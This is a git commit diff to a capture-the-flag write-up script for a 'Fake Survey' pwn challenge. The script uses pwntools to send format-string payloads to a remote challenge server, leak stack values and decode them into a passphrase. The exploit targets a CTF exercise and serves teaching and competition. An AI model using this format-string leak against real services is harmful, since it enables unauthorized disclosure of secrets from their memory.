88e568bf6e761110586b9ae59cb58be86c8597a4
TMUCTF <90703099+TMUCTF@users.noreply.github.com>
2021-09-25 07:58:11 +0330

    Add files via upload

--- Pwn/Fake Survey/Writeup Files/solve_step1.py
+++ Pwn/Fake Survey/Writeup Files/solve_step1.py
@@ -5,19 +5,19 @@ i = 1
 a = []
 while i != 15:
     r = pwn.remote("185.235.41.205", 7050)
+    r.recvlines(20)
     p = "%" + str(i) + "$p"
     r.sendline(p.encode())
-    r.recvlines(21)
-    admin_pass = r.recvline().decode().split(" ")[-1]
-    print(admin_pass)
-    a.append(admin_pass)
+    user_pass = r.recvlines(2)[1].decode().split(" ")[-1]
+    print(user_pass)
+    a.append(user_pass)
     i += 1
 
-flag = []
+passphrase = []
 for k in a:
     try:
-        flag.append(pwn.p32(int(k, 16)).decode("latin-1"))
+        passphrase.append(pwn.p32(int(k, 16)).decode("latin-1"))
     except Exception as e:
         pass
 
-print("".join(flag))
+print("".join(passphrase))
